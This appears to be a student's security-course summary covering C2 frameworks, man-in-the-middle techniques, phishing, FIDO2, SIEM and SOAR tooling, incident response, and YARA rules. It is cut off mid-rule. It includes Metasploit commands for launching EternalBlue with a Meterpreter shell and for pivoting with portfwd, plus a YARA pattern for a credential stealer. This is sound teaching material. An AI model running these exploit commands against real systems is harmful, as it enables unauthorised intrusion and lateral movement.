    In order to trace individual requests on a web app, the system that terminates TLS from clients #hinweis[(e.g. WAF)]
    needs to create a _unique ID_ for that request #hinweis[(doesn't have to be a random number)].

    When the request passes through the various backend services, this ID is always passed along and written into log
    files, together with a timestamp. This enables _correlation_ across logs of different services and makes it easier
    to trace a request throughout the system.
  ],
  chronos.diagram({
    import chronos: *
    _par("Attacker")
    _par("WAF")
    _par("Backend")
    _par("DB")

    _seq("Attacker", "WAF", comment: [SQL Injection])
    _seq("WAF", "WAF", comment: [Create Request ID,\ log with ID & timestamp])
    _seq("WAF", "Backend", comment: [Pass ID along, log\ with ID & timestamp])
    _seq("Backend", "DB", comment: [Pass ID along, log\ with ID & timestamp])
  }),
)


= C2 Frameworks
#v(-0.5em)
== Covenant
Covenant is a C2 framework built in .NET. It has various payloads, but most are geared towards Windows.

- _Listener:_ Listens to connections from grunts. The main listener is the `HTTPListener`, which can be configured for
  HTTP or HTTPS.
- _Launcher:_ Program created by a listener to run on the victim. There are many different Launchers: PowerShell,
  MSBuild, .NET binary, WMIC, Regsvr32...
- _Grunt:_ Once a launcher has been executed and a connection to its listener has been established, it turns into a
  grunt. A grunt can execute shell commands, start programs, bypass Windows User Account Control (UAC), start a key
  logger, persist itself and more.

== Metasploit
The Metasploit Framework is a tool to develop and run exploits against targets. It is based around the concepts of
_exploits_ and _payloads_. The workflow of a attack with Metasploit is:

```sh
use exploit/windows/smb/ms17_010_eternalblue # Set the exploit - here the EternalBlue vuln
set LHOST eth0                               # Set the network interface the exploit connects to
set RHOST target.example.com                 # Set the address of the target
set payload windows/x64/meterpreter/bind_tcp # Set the payload - here Meterpreter via bind shell
exploit                                      # Attack!
```

#pagebreak()

=== Exploits
Exploits in Metasploit abuse a certain vulnerability to gain access to a target. There are two types of exploits:
- _Active exploit:_ Attacks a specific host, runs until completion then shuts down
  #hinweis[(e.g. Brute force modules will exit when a shell opens on the target)]
- _Passive exploit:_ Waits for incoming hosts and attacks them as they connect. They focus on clients
  #hinweis[(web browsers, FTP clients)]. They report shell access on victims as they happen and these shells
  can be individually accessed.

=== Payloads
Once a target has been accessed with a exploit, a payload can be deployed. This can be as simple as starting a shell or
deploying a whole payload framework. Payloads can be grouped into the following categories:
- _Inline/Non-staged/Singles:_ Standalone payloads that contain the entire code
  #hinweis[(start a program, add new user)]
- _Stager:_ Set up a network connection to the attacker, usually via @bind-shell or @reverse-shell and lets the attacker
  download stages
- _Stage:_ Payload components to be downloaded by stagers to execute further attacks

=== Meterpreter
The most well known stager is _Meterpreter_. It runs completely in memory and features various extensions to exploit the
target: Download/upload/edit files, execute programs, take screenshots, dump the SAM DB 0
#hinweis[(Windows user configuration database)], be a keylogger, starting other attacks against services running on
the machine...

#grid(
  columns: (1fr, auto),
  [
    One of the most useful Meterpreter features is _Port Forwarding_: If we know our victim is connected to multiple
    subnets and we want to attack another machine in a different subnet, we can use `autoroute` to add new routes into
    the Metasploit routing table. The `portfwd` command in Meterpreter allows the attacker to forward network traffic from
    the victim machine to another system or port. This is useful for accessing internal services on the victim's network
    that would otherwise be unreachable (_lateral movement_ inside the network).
  ],
  [
    ```sh
    # Run after setting up metasploit
    use post/multi/manage/autoroute
    set SESSION 1
    set SUBNET 192.168.75.0
    set NETMASK /16
    run
    # -l: local port, -p: remote port
    portfwd add -l 2222 \
      -r 192.168.75.133 -p 22
    ```
  ],
)

=== Msfvenom
_Msfvenom_ is a standalone payload generator. It can create Metasploit payload executables or attach them to existing
binaries. To hide the payloads from antivirus software, Msfvenom can also apply encoders to the generated payloads.


= Man-in-the-Middle Attacks (MitM) <mitm>
In a Man-in-the-Middle attack (MitM), an attacker inserts themselves into communications of two (or more) parties.
They can read all exchanged messages and send modified messages to the parties. A MitM can be performed at different layers:

#table(
  columns: (1fr, 0.5fr, 0.5fr),
  table.header([Infrastructure level], [Network level], [Application level]),
  [
    - Forge BGP announcements to route traffic over attacker-controlled servers
    - IMSI catchers at border control to link phone ID to passport
    - Rouge 4G/5G antenna to function as IMSI catcher
    - Surveillance with court order through (mobile) provider
    - Fake Access Point offering free Wi-Fi
    - NFC Relaying Attack to send your card data to a payment terminal somewhere else
  ],
  [
    - Capture Bluetooth advertisement, connect to device, then re-advertise that device again
    - ARP spoofing
    - DHCP poisoning
  ],
  [
    - Software installed on client #hinweis[(Malware, Surveillance software)]
    - Attack on remoting protocols #hinweis[(SSH, RDP)]
    - Man-in-the-Browser
  ],
)

#pagebreak()

== Downgrading encrypted traffic <downgrading-encrypted-traffic>
A MitM-attack on _unencrypted traffic_ #hinweis[(DHCP, DNS, HTTP, SMTP)] can easily read and manipulate messages. When
dealing with _encrypted traffic_ #hinweis[(HTTPS, SSH, SMB, SMTPS, RDP)], the attacker must either do _TLS termination_
#hinweis[(see @waf)], or _downgrade the connection_ to insecure or no encryption. This may generate warnings to the user,
alerting them that something is up.

#grid(
  columns: (1fr, auto),
  [
    + When a client first connects to a server, it sends a "Client Hello" as part of the TLS Handshake to the server.
      It contains all the encryption ciphers the client supports.
    + The MitM forwards this package unmodified to the server.
    + The server responds with a TLS "Server Hello", containing all the ciphers it supports.
    + The MitM now removes all (secure) ciphers from the Server Hello, making it appear to the client that the server
      doesn't support encryption at all (or only with insecure ciphers).
    + The client falls back to insecure or no encryption
    + The MitM can now read all messages.
  ],
  chronos.diagram({
    import chronos: *
    _par("Client")
    _par("MitM")
    _par("Server")

    _seq("Client", "MitM", comment: [TLS Client Hello])
    _seq("MitM", "Server", comment: [Forward Client Hello])
    _seq("Server", "MitM", comment: [TLS Server Hello])
    _seq("MitM", "Client", comment: [Remove all ciphers\ from Server Hello])
    _seq("Client", "MitM", comment: [Connects unencrypted])
    _seq("MitM", "Server", comment: [Connects unencrypted])
  }),
)

*Prevention:*
- _Disable weak/unencrypted connections server-side:_ If the server only offers secure ciphers, a downgrade attack is
  harder because the server doesn't accept these types of connections. The MitM would need to add TLS termination or
  never contact the server at all by serving a fake website to the client or similar.
- _Perfect Forwarding Secrecy (PFS):_ Protects past sessions against future compromises of keys or passwords.
  By generating a unique _ephemeral key_ for every session a user initiates, the compromise of a single session key
  will not affect any data other than the data exchanged in the specific session protected by that particular key.
  Even if the private key is revealed, past sessions cannot be decrypted.
- _HTTP Strict Transport Security (HSTS):_ See chapter @hsts

== Types of Man-in-the-Middle attacks
#v(-0.5em)
=== DHCP Spoofing/DHCP Poisoning
#grid(
  columns: (1fr, auto),
  [
    + The attacker sets up a fake DHCP server
    + Client sends out a DHCP request. Because these are always a broadcast, both the real and fake servers receive the request.
    + The _faster response wins_. To up its chances, the attacker can start a Denial-of-Service attack on the real DHCP
      server.
    + In the answer, the attacker sets a DNS server also under their control. They can now control address resolving and
      direct their clients to fake websites.
  ],
  chronos.diagram({
    import chronos: *
    _par("Client")
    _par("Att dhcp", display-name: align(center)[Attacker DHCP])
    _par("Att dns", display-name: align(center)[Attacker DNS])
    _par("Cli dhcp", display-name: align(center)[Real DHCP])

    _seq("Client", "Cli dhcp", comment: [DHCP Request (Broadcast)])
    _seq("Client", "Att dhcp", comment: [DHCP Request (Broadcast)])
    _seq("Att dhcp", "Cli dhcp", comment: [Optional: DoS-ing real server])
    _seq("Att dhcp", "Client", comment: [DHCP Response with\ Hacker DNS address])
    _seq("Cli dhcp", "Client", comment: [Real DHCP Response arrives too late or never], end-tip: ("x", ">"))
  }),
)

=== DNS Spoofing/DNS Poisoning
#grid(
  columns: (1fr, auto),
  [
    + The client gets a IP address from the DHCP as normal and the DHCP registers the client's hostname in the DNS
    + The attacker sends out a DNS `DELETE` command for `ost.ch` to remove the correct entry from the DNS
    + The attacker sends a DNS `ADD` command for `ost.ch` containing an IP address under their control.
    + Any DNS responses for `ost.ch` now contain the attacker's spoofed IP.

    *Important:* The attacker's packages must be forged with a library like `scapy` to change the _origin IP to that
    of the DHCP_, as most DNS servers only accept DNS updates originating from the DHCP-IP.

    DNS spoofing can be _prevented with DNS over HTTPS (DoH)_, as the DNS query will then be encrypted and answered by the DoH
    provider instead of the local DNS server.
  ],
  chronos.diagram({
    import chronos: *
    _par("Client")
    _par("Attacker")
    _par("DHCP Server")
    _par("DNS Server")

    _seq("Client", "DHCP Server", comment: [DHCP Broadcast])
    _seq("DHCP Server", "DNS Server", comment: [Update DNS, add\ client's hostname])
    _seq("DHCP Server", "Client", comment: [DHCP Response])
    _sep("Start of DNS Spoofing")
    _seq("Attacker", "DNS Server", comment: [Forged DNS `DELETE` for `ost.ch`])
    _seq("Attacker", "DNS Server", comment: [Forged DNS `ADD` for `ost.ch`])
    _seq("Client", "DNS Server", comment: [DNS request for `ost.ch`])
    _seq("DNS Server", "Client", comment: [DNS response with spoofed IP address])
  }),
)

=== ARP Spoofing
#grid(
  columns: (1fr, auto),
  [
    In a LAN environment, each IP address must be resolved to a MAC address. To get a specific MAC address, a _ARP request_
    is sent as a broadcast to the entire network. Once the MAC is known, the device stores it inside its _ARP table_
    for further communication.

    Any device can just send ARP responses (without any request!), so-called _gratuitous ARP_ packages. Most devices accept
    gratuitous ARP packages so they can quickly switch over to a new IP without discovering them through failed communications.
    This can be abused, as ARP doesn't have any kind of authentication.

    A attacker can thus send out gratuitous ARP packages that set the MAC of all devices to their MAC and can thus
    intercept all traffic between these devices.
  ],
  chronos.diagram({
    import chronos: *
    _par("vic", show-bottom: false, display-name: align(center)[*Victim*\ #hinweis[`192.168.1.10`\ `AA:AA:AA:AA:AA`]])
    _par("srv", show-bottom: false, display-name: align(center)[*Server*\ #hinweis[`192.168.1.30`\ `CC:CC:CC:CC:CC`]])
    _par("att", show-bottom: false, display-name: align(center)[*Attacker*\ #hinweis[`192.168.1.20`\ `BB:BB:BB:BB:BB`]])

    _seq("vic", "srv", comment: [Connect to Server via\ `CC:CC:CC:CC:CC`])
    _seq("srv", "vic", comment: [Connect to Victim via\ `AA:AA:AA:AA:AA`])
    _sep("Attack Start")
    _seq("att", "vic", comment: [Broadcast: `.1.10` and `.1.30` are at `BB:BB:BB:BB:BB`])
    _note("across", [Both Victim and Server update their ARP tables])
    _seq("vic", "att", comment: [Connect to Server via `BB:BB:BB:BB:BB`])
    _seq("att", "srv", comment: [Forward traffic to Server])
    _seq("srv", "att", comment: [Connect to Victim via\ `BB:BB:BB:BB:BB`])
    _seq("att", "vic", comment: [Forward traffic to Victim])
  }),
)

#pagebreak()

=== SSH Man-in-the-Middle
On every SSH connection, the client downloads the _fingerprint of the SSH server_ and compares it to the one stored on the
client. The fingerprint is usually based on the server's public key. Since there is no fingerprint available on first
connection, the user must _explicitly trust the fingerprint_.
On subsequent connections, SSH will just connect without any messages if the fingerprint still matches.

When a SSH connection gets intercepted and re-encrypted by a Man-in-the-Middle attack, the victim receives a warning
that the fingerprint of the server has been changed. If the user has _strict checking enabled_, the new key cannot be
simply adopted by saying "Yes". The old host key must be manually removed:

```sh
ssh-keygen -f "~/.ssh/known_hosts" -R "hostnameOfSshServer"
```

This can be avoided by using _SSH Public Key Authentication_. When using public key authentication, each user has two
keys:
- _Public key:_ Can be freely shared with anyone. With the public key, data can be encrypted. To connect to a server,
  the public key of the client is copied onto the server to whitelist this key.
- _Private key:_ Remains with the user that created it. Data encrypted with the public key can only be decrypted with
  the corresponding private key. Never share your private key!

To log in with public key authentication, we first need to create a public/private key pair by running `ssh-keygen`.
The public key now needs to be copied onto the _`~/.ssh/authorized_keys`_ directory of the server, with the user directory
matching the one you want to login as. The process can be done manually or with the `ssh-copy-id` command.

When establishing a SSH connection, the server verifies if the certificate of the newly connected client matches wuth
one of the public keys in `~/.ssh/authorized_keys` and if they don't, the connection is refused.\
But to avoid falling back to password authentication when key verification fails, the client needs to disable password
authentication in their SSH config.

==== SSH with 2FA
It is also possible to setup SSH to work with TOTP authenticator apps like Google Authenticator.

_2FA does not prevent SSH MitM!_ Possible exploits are:
- _Authentication Relaying_: If the MitM can proxy the protocol end-to-end, it can proxy the second factor too, because
  the 2FA is part of the same authenticated session handshake.
- _Session Hijacking_: Once the authentication is complete, the attacker can still intercept and manipulate the session,
  regardless of whether 2FA was used.

The MitM attack exploits the fact that the client fails to verify the identity of the server. 2FA does not change this
issue since 2FA only verifies the user's identity.

Only mutual authentication via _public key_ auth can accomplish _MitM protection_. Public-key user authentication
prevents an attacker from stealing reusable credentials because the private key never leaves the client: The client
proves possession by signing a challenge. The client also keeps a copy of the server's public certificate inside
`known_hosts`.

=== RDP Man-in-the-Middle
RDP supports two security types:
- _Standard Security:_ Encrypts traffic with RC4 #hinweis[(symmetric key)]. Encryption values are shared during
  connection set-up
- _Enhanced Security:_ Encryption is handled by external protocols #hinweis[(TLS, CredSSP with NLA, RDSTLS)]. The used
  protocol is either pre-set or negotiated during setup

Before the introduction of _Network Level Authentication #hinweis[(NLA)]_, RDP always established a full session that
presented the regular login screen of the server to enter credentials. This type of the authentication is wasteful,
as the server has to allocate resources for a session even if the login fails.

#pagebreak()

With NLA, the authentication is performed before a full RDP session is established. This preserves resources, as a
graphical session is only established when the authentication attempt is successful. It works like this

+ _Initial Request:_ The client establishes a RDP session with the server
+ _Negotiation Phase:_ The server presents its supported authentication methods, which includes NLA. The client then can
  respond that it likes to continue with NLA.
+ _Credential Validation:_ NLA uses CredSSP to securely pass the credentials
+ _Session Establishment:_ When the credentials are valid, the connection is encrypted using TLS and the user is granted
  a full graphical RDP session.

_CredSSP_ is a protocol to securely transmit credentials. NLA uses it internally. The credentials are usually validated
with NTLM or Kerberos.

Without NLA, the login is not encrypted and a MitM can successfully grab the login details while they are being sent to
the server. In contrast, if invalid credentials are sent with NLA, the session is terminated early without many wasted
resources. If a connection with valid credentials is established, the session data is transmitted with TLS to prevent
Man-in-the-Middle eavesdropping.

If the 2FA is integrated after the credentials are accepted, then an attacker could still intercept or relay the
credential portion and then be stuck with a 2FA challenge it can't solve. But if the MitM can _intercept and relay the
2FA prompt and response_ in real time, then the attacker might succeed in relaying the full login
#hinweis[(credential + 2FA)] to the real server.\
If, however, the 2FA is integrated within the same secure login channel #hinweis[(i.e. the second factor is part of the
  credential negotiation in the TLS/CredSSP exchange)], then it becomes harder for a MitM to intercept or fake the 2FA
step without being noticed or failing to pass the verification because the second factor is also encrypted.0

=== Malware-based Man-in-the-Middle
A malware installed into the client has various methods to create MitM-attacks:
- _Change the `hosts` file:_ The `hosts` file #hinweis[(Windows: `C:\Windows\System32\Drivers\etc\hosts`,
    Unix: `/etc/hosts`)] is the first resource for resolving addresses, before any DNS is consulted. Any IP set there
  will be used to connect to the specified domain. A malware can add entries to redirect a victim to an attacker-controlled
  server
- _Setup System Proxy with malicious trusted root certificate authority:_ The malware sets the system proxy to an
  attacker controlled one and installs a CA certificate the attacker created as a "Trusted Root Certificate" in the
  system, so HTTPS connections can also be sent to it.

=== Rogue Access Point
The attacker sets up a fake access point the victims connect to. The traffic is inspected by redirecting ports 80 and
443 to a local proxy with `iptables`. However, this method will lead to HTTPS errors on the user side if the certificate
is not trusted.

== Man-in-the-Middle prevention
- _User awareness campaigns_: Costly, time intensive, ineffective after a while
- _Traditional 2FA_: Depending on the type it doesn't protect from phishing
- _FIDO2_: Standard behind hardware tokens, see @fido2

=== HTTP Strict Transport Security (HSTS) <hsts>
Allows a server to instruct a browser that it must only communicate with the site using HTTPS, never HTTP, for a
specified period of time. After the first HTTPS visit, the server sends the _`Strict-Transport-Security` header_, which
tells the browser to only establish HTTPS connections to this domain, reject all HTTP requests and enforce certificate
validation. Domains can also be included in the HSTS preload list, making the browser enforce HTTPS even before the
first visit. _Protects sessions from MitM-attacks, downgrading and session hijacking_.

=== Mutual authentication with client certificates
Both the server and client share their certificate with each other. They can now sign their communication and verify with
the shared certificate that the package is really coming from the system they expect. If a MitM-attack happens, the
attacker would replace the Public Key and the signed package hash with their own. But the receiver will not accept this
forged package, because the CA signature doesn't match.


= Phishing & Authentication
#v(-0.5em)
== Offline Phishing
The attacker provides a website that mimics the login flow of a website the user has an account on. When they enter
their login data, it is transmitted to the attacker. The credentials are not immediately forwarded to the target
website, just stored by the attacker. They can then login into the real website with these credentials at a later date.

*How can the attacker make the user go on their fake website?*
- Claim that an application is now reachable under a new link
- A HTML link where the link text is the real website, but `href` points to the attacker site
- _Homograph attack:_ Register a domain with a hard-to-spot typo or Punycode and send a link to it

*Mitigations:* User Awareness Training, 2FA, Monitor domain registrations similar to your own

== Online Phishing
In online phishing, the attacker has a MitM session established with the victim. When the victim logs into a website,
the website thinks the attacker is the actual user and the user thinks the attacker is the actual server. To keep this
alive, the _attacker_ must rewrite all URLs from the real website to their domain. This includes _cookies_ and _links
in HTML, JS & headers_.

== Authentication
Authentication is the process of verifying who the user claims to be. It may involve different factors:
- _To know something:_ Password, PIN...
- _To own something:_ Smartcard, One Time Password (OTP), Yubikey, Authenticator App...
- _To be something:_ Fingerprint, Iris, Voice, Face...

Multi-Factor Authentication combines at least two different factors. Most second factor mechanisms _do not protect
against Phishing_: A MitM can steal Username/Password *and* a OTP, as they are sent through the same device. However, if
the second factor works via confirming a push notification on a device, this is no longer possible, as _the device
directly communicates to the server_ and not through the MitM victim.

#align(center)[
  #figure(
    image(width: 75%, "img/phishing-2fa-otp.png"),
    caption: [Phishing attack where the 2FA token gets sent through the MitM],
  )
  #figure(
    image(width: 75%, "img/phishing-2fa-notif.png"),
    caption: [Phishing attack where the 2FA goes through a push notification, bypassing the MitM],
  )
]

=== FIDO2 <fido2>

#grid(
  columns: (1fr, auto),
  [
    _Fast Identity Online 2 (FIDO2) _is a authentication protocol, primarily for use in the web. Its main feature is
    that the authentication information is stored in a _hardware token_ that the client possesses, the _authenticator_.

    + During _registration_, a key pair is generated for this relying party by the authenticator.
      The public key is then sent to the relying party.
    + When the user attempts to log in, the relying party sends the _origin_ #hinweis[(its domain name)] and a
      _challenge_.
    + The client verifies that the origin in the challenge and the website domain match and forwards that to the
      authenticator.
    + The authenticator looks up the private key of that origin and _signs the challenge_ with it.
      The result is forwarded to the client and then to the relying party
    + The relying party looks up the public key of the authenticator sent during registration.
      If the signature of the signed challenge matches the public key, the login is successful

    The authenticator stores a key pair for each relying party that is registered, so a _private key is never reused_
    across different relying parties.
  ],
  chronos.diagram({
    import chronos: *
    _par("auth", display-name: align(center)[*Authenticator*\ #hinweis[(Yubikey, Phone)]])
    _par("client", display-name: align(center)[*Client*\ #hinweis[(Browser, OS)]])
    _par("website", display-name: align(center)[*Relying Party*\ #hinweis[(Website)]])

    _seq("auth", "website", dashed: true, comment: [*Registration on Website:*\ Generate key pair, submit public key])
    _sep("Start of login process")
    _seq("website", "client", comment: [Send challenge\ and origin #hinweis[(eg. `ost.ch`)]])
    _seq("client", "auth", comment: [Validates origin,\ forwards data if OK])
    _seq("auth", "auth", comment: [Sign challenge using\ secret key for origin])
    _seq("auth", "client", comment: [Sends signed\ challenge])
    _seq("client", "website", comment: [Forwards signed\ challenge])
    _seq("website", "website", flip: true, comment: [Lookup public key\ & verify signature])
    _seq("website", "client", comment: [Login success!])
  }),
)

#table(
  columns: (auto, 1fr),
  table.header([Protocol], [Description]),
  [*CTAP*\ #hinweis[(Client to Authenticator)]],
  [
    The communication between the client and authenticator happens in CTAP. FIDO2 uses the newer CTAP2 standard.
    Supported bindings: USB HID, NFC, Bluetooth & Bluetooth Low Energy
  ],

  [*WebAuthn*\ #hinweis[(Web Authentication)]],
  [
    Standardized JavaScript API for FIDO2. Implemented by browsers and related web infrastructure
  ],
)

== PsExec
PSExec is a tool from the Microsoft Sysinternals suite that provides SSH-like functionality for Windows.
The user enters username, password and address of the server they want to connect to. The process works as follows:
#grid(
  [
    + Authentication with credentials on server
    + Install the PsExec service with `sc.exe`
    + Execute the entered shell command
  ],
  [
    4. Result is sent back to the client
    + Service is deregistered when client disconnects
  ],
)

#pagebreak()

= Monitoring & Detection
Different Cyber Security methods serve different purposes:

#table(
  columns: (1fr,) * 3,
  table.header([Prevention], [Response], [Recovery]),
  [
    - Hardening
    - Isolation #hinweis[(VM, Docker)]
    - Penetration Testing
    - Red Teaming
    - Awareness
    - SIEM, SOAR, EDR
    - Threat Intelligence
  ],
  [
    - Incident Management
    - Hunting
    - Forensic
    - Containment
    - Triage
    - Timeline Reconstruction
  ],
  [
    - System Rebuild
    - Access Recovery
    - Credential Reset
    - Post-mortem
    - Post-incident hardening
    - Compliance & Business Recovery
  ],
)

#figure(
  image("img/defense-evolution.png"),
  caption: [Evolution of Cyber Security Defense],
)

Analyzing a cyber attack falls in the domain of _Digital Forensics and Incident Response (DFIR)_.

== SIEM <siem>
_Security Information and Event Management (SIEM)_ solutions are responsible for _collecting log and event data_ from
various sources such as the network, servers and applications and aggregating, identifying, categorizing and analyzing
this data in real time. With a SIEM solution, security problems should be detected automatically as well as the ability
to send an alert.\
*Tasks:* Pattern search in log data for indicators of a cyber attack (so-called _Indicators of Compromise (IOC)_),
correlation of event information, identifying abnormal activity, sending alerts according to defined alert rules

In short: A SIEM is a _logging + filter + alert solution_. The most well known SIEM is _Splunk_.

=== Wazuh
_Wazuh_ is an _open-source SIEM and Extended Detection and Response (XDR) solution_ for centralized monitoring of
_endpoints, servers, and cloud systems_. It combines classic _SIEM capabilities_ with _host-based intrusion detection
(HIDS)_ #hinweis[(uses a monitoring service installed on clients)], plus integrity monitoring, compliance checks,
and vulnerability detection.

The _Wazuh Agent_ is installed on clients and servers and collects security-relevant data such as logs, security events,
inventory data, and integrity reports. This data is sent encrypted to the central _Wazuh Manager_.
The Wazuh Manager analyzes the data in _real time_ using rules and correlation, detecting attack patterns, indicators
of compromise, and unusual behavior.

When suspicious events occur, Wazuh automatically generates _alerts_ with different severity levels, which can be
forwarded via dashboards, email, or external systems.

In addition, Wazuh supports _compliance monitoring_, _vulnerability detection (CVE matching)_, and _integration with the
ELK stack #hinweis[(ElasticSearch, Logstash, Kibana)]_ for log analysis and visualization.

== SOAR
_Security Orchestration, Automation and Response (SOAR)_ also collects data from various sources similar to a SIEM, but
SOAR additionally supports the incident responder in managing the crisis. SOAR enables automated intervention when a security
incident occurs #hinweis[(e.g. automatically quarantine affected systems)]. A SOAR system also supports the incident
responder in rolling out security countermeasures #hinweis[(e.g. to Active Directory).]\
*Tasks:* Alert Investigation, Orchestration, Automation workflow

In short: A SOAR is _SIEM + a action plan in case of compromise_. We used _Velociraptor_ in the exercises. A big use case
is to detect patterns on the machines in your network after an incident:
- URLs, Credit card data in process memory
- Malware signatures in binaries
- Malware patterns in registry

== EDR
_Endpoint detection and response (EDR)_ is a software installed on clients that continuously monitors the client and
acts on rules when unusual activity occurs. This is also what differentiates a EDR from a HIDS: A HIDS just monitors,
while a EDR also reacts to threats.


= Incident Response
#v(-0.5em)
== Cyber Security Response Teams
The name _"Computer Emergency Response Team (CERT)"_ was first used in 1988 by the CERT Coordination Center at Carnegie
Mellon University. Because the term is trademarked and cannot be used freely, there are multiple alternative names
available: _Cyber/Computer Incident Response Team (CIRT)_, _Computer Emergency Security Incident Response Team
(CESIRT)_, _Computer Security Incident Response Team (CSIRT)_ etc. But they mean more or less the same thing: A team
that responds to major security incidents.

This is different from a _Security Operations Center (SOC)_, which proactively monitors and detects threats across the
organization and is responsible for day-to-day security.

There are different frameworks to choose from when handling a cyber incident:
#table(
  columns: (1fr,) * 2,
  table.header([NIST Incident Response Framework], [SANS Incident Response Plan]),
  [
    + Preparation
    + Detection and Analysis
    + Containment, Eradication and Recovery
    + Post-Incident Activity
  ],
  [
    + Preparation
    + Identification and Scoping
    + Containment & Intelligence Development
    + Eradication & Remediation
    + Recovery
    + Lessons Learned
  ],
)

== Indicators of Compromise (IoC)
Indicators of Compromise (IoC) define _characteristics of an incident_ in a structured manner. They have the goal to
describe, communicate and find artifacts related to incidents. Currently, there is no agreed-upon standard, so there
are different competing formats to describe artifacts: YARA, STIX, TAXII, OpenIoC, Snort...

#pagebreak()

== Attack Types
Cyber attacks can usually be classified in one of two categories
#table(
  columns: (1fr, 1fr),
  table.header([Smash and Grab], [Exfiltration]),
  [
    Technique used by Ransomware groups. Attackers enter through the easiest entrypoint and visibly break stuff.
    Usually demand ransom through data encryption and threaten to release sensitive documents.
    But once they are gone, they are gone; no additional backdoors.
  ],
  [
    Technique used by APTs. They slowly build up many channels from inside the network to establish persistence.
    Attackers act slowly. Even if one entrypoint is detected, they have others. Difficult to get rid of.
  ],
)

== Procedure during an Incident
Your company is suffering from an attack. What to do?

*First Step: Bestandsaufnahme*
#v(-0.5em)
+ Gather as much information as possible about the current state of your systems.

+ _Create a board that lists the "Ist-Zustand" and "Soll-Zustand"_.\
  *Example:*
  *Ist-Zustand:* A link in a spam mail has been clicked, PC is unusually slow, a window was flashing up quickly,
  high resource usage, a ransom has popped up, some systems are down.\
  *Soll-Zustand:* Production is running again.

+ List the impact for the _business_ #hinweis[(Is production still running?)],
  _company IT_ #hinweis[(are critical systems still running?)] and
  _stakeholders & communication_ #hinweis[(Has there been a ransom? Does the company board know about the state?)]

The Bestandsaufnahme must be carried out by the incident response team, the "Krisenstab". The challenge here is that
there must be not only be IT people present in the team, as they lack the necessary business focus for prioritization.
Business people must also be present to determine what to restore first.

_Key Question:_ Can employees still work? What can be done so the business is still operating?

*Second Step: Emergency Meeting*\
Create a 15 minute emergency meeting to share the findings. Is there something known about the attacker?
How long will the time to recover be?

The communication plan is important: Inform employees first before you inform the press. The head of the incident
response team decides what to say to the media, not the CEO.

*Third Step: Option Meeting*\
The purpose of the emergency meeting is to provide status updates, not to hold long discussions.
To do so, an Option Meeting is held: Here, different options and measures are discussed in more depth.

=== Example Incident Procedure: Ransomware attack
#grid(
  [
    + Analyze systems
    + Reconstruct attack
    + Don't do instant recovery, risk of reinfection
    + Damage control, disconnect devices
  ],
  [
    5. Scan firewall and log files for info
    + Create a alternate IT plus communication channels so IT can work
    + Rescue backups from ransomware
  ],
)

=== Example Incident Procedure: Espionage
#grid(
  [
    + Check logs and running processes
    + Identify attacker infrastructure
    + Understand attack
    + Initialize countermeasures
  ],
  [
    5. Silently stop espionage #hinweis[(Attacker shouldn't know they were found)]
    + Analyze what data has been exfiltrated
    + Analyze what data the attacker still has access to
  ],
)

#pagebreak()

= Data Scanning and Manipulation Tools
#v(-0.5em)
== CyberChef
CyberChef is a web app for encryption, encoding, compression and data analysis. In can perform a wide range of
operations, including encoding and decoding, hashing, and making HTTP requests, among many others.
These operations can be chained together to form a "recipe" to transform data.

*Useful CyberChef operations*
- _Fork:_ Splits input data based on a specified delimiter
- _Register:_ Stores data in registers so it can be reused by subsequent operations
- _Filter:_ Filters data using a regular expression
- _Unique:_ Removes duplicate values
- _Extract Domains:_ Extracts domain names from the input data

*CORS limitations when using HTTP requests*\
CyberChef runs entirely in the _browser_, so all HTTP requests are subject to _Cross-Origin Resource Sharing (CORS)_
restrictions. If a target server does not allow the _CyberChef origin_ in its CORS policy, the _response_ will be
blocked by the browser. Blocked responses usually prevent access to _response bodies_, _headers_, and _status codes_,
even if the request itself is sent. This limitation affects workflows that rely on _HTTP requests_ for enrichment,
validation, or data fetching.

*Common workarounds*
- Use a _CORS-enabled proxy_ to relay requests and add permissive CORS headers.
- _Self-host CyberChef_ or run it _locally_ so it can share the same _origin_ as the target service.
- Perform HTTP requests externally using tools like _curl_ or _Python scripts_, then import the fetched data into
  CyberChef for further processing.

== YARA
YARA #hinweis[(Yet another ridiculous acronym)] is a _pattern matching_ and _keyword scanner tool_ designed to detect
malware artifacts on infected system. Since filtering by hashes is very restrictive, YARA uses rules designed to
identify binary patterns in bulk data.

```sh
# Run recursively (-r) on ~/malware with the rules in index.yar
yara -r /opt/applic/yara-rules/index.yar ~/malware
# Run only the rules tagged with "Packer" and "Compiler", and supress warnings (-w)
yara -w -r -t Packer -t Compiler /opt/applic/yara-rules/index.yar ~/malware
```

Many other security tools have YARA support built-in, like Velociraptor or Volatility. YARA should be used as a
_first-level triage tool_: Depending on the signature, it can lead to many false positives. Try including additional
context around the hits to eliminate false positives.

=== Yara Rules
Yara rules are written in a custom, C-like format with the `.yar` extension. The two most important sections are
_`strings`_ and _`conditions`_. The former defines the _strings and binary patterns_ to look for, while the latter
contains the _rule's logic_. It contains binary expressions that determine whether the rule is satisfied.

#table(
  columns: (auto, 1fr),
  table.header([Element], [Description]),
  [Visibility],
  [
    Keyword before the rule name. `public` if not specified. `private` rules do not trigger alerts.
    Visibility can be used to split larger rules into smaller ones.
  ],

  [Rule name], [At the top after the `rule` keyword. Is case-sensitive, is alphanumeric and underscore only.],
  [Tags], [After the rule name and a "`:`". Used for reporting and categorizing rules],
  [`meta:`],
  [
    Arbitrary key-value pairs, often specifying author, description and additional resources.
    Cannot be referenced in strings or condition
  ],

  [`strings:`],
  [
    Declare variables. The name has to start with a `$` sign. Variable name must be alphanumeric and underscore only.
    Any string enclosed in forward slashes will be treated as _regex_.

    Strings can have modifiers, which are placed after the value.
    - _`ascii`_: Search for one byte per character #hinweis[(default, can be combined with `wide`)]
    - _`wide`_: Search for two bytes per character
      #hinweis[(common in many executable binaries, doesn't fully support UTF-16)]
    - _`private`:_ Private strings will never be displayed in YARA output
    - _`nocase`:_ Match case-insensitive on this string
    - _`fullword`:_ Only match if delimited by non-alphanumeric character #hinweis[(e.g. whitespace)]
    - _`xor`:_ XORs every single byte combination with the string
    - _`base64`:_ Searches for the base64-encoded variant of the string
  ],

  [`condition:`],
  [
    Specifies when this rule should trigger an alert. Usually checks whether some string has been detected.
  ],
)

*Example 1*
#v(-0.5em)
```yar
rule macrocheck : maldoc { // "maldoc" is a tag
  meta: // this is a comment
    Author = "Fireeye Labs"
    Description = "Identify office documents with the MACROCHECK credential stealer in them..."
    Reference = "https://www.fireeye.com/blog/threat-research/2014/11/fin4_stealing_insid.html"
  strings:
    $PARAMpword = "pword=" ascii wide
    $PARAMmsg = "msg=" ascii wide
    $PARAMuname = "uname=" ascii
